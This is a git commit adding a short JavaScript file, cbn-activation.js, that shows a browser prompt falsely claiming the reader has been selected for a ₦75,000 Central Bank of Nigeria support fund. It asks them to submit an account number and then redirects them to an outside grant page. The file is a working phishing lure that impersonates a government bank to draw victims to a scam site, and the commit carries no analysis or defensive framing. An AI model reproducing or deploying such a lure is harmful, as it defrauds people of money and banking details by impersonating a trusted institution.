d3e52e84b6c6b465bacb7c0784aa2034364c764e
boss-bloq <nsisboy01@gmail.com>
2024-10-06 04:08:38 -0700

    Create cbn-activation.js

---
+++ cbn-activation.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw ₦75,000'
+password=prompt('SMS: Payment ongoing. You are among the selected ones to Receive ₦75,000.00 Nationwide Support Fund from CBN, kindly press Ok to submit account number now ','Withdraw ₦75,000');
+if (password != 'Withdraw ₦75,000') {
+location.href='https://damba-fest.org/cbn-grant.html';
+}
